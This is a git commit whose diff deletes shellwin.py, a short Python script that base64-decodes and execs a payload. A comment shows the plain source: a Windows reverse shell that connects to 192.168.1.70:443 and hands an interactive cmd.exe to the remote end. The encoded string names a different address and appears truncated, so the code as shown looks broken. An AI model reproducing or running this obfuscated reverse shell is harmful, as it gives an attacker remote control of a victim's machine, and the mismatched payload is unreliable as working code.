b40a3c1d0ea293f68aff970af9b068683c619c24
vid4l-07 <82414351+vid4l-07@users.noreply.github.com>
2024-09-20 23:24:20 +0200

    Delete shellwin.py

--- shellwin.py
+++
@@ -1,8 +0,0 @@
-import base64
-
-
-stri = "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzE5Mi4xNjguMS4xMTEnLDQ0MykpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWydDOlxXSU5ET1dTXHN5c3RlbTMy"
-
-# from: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.70',443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['C:\\WINDOWS\\system32\\cmd.exe','-i']);
-
-base64;exec(base64.b64decode(stri))
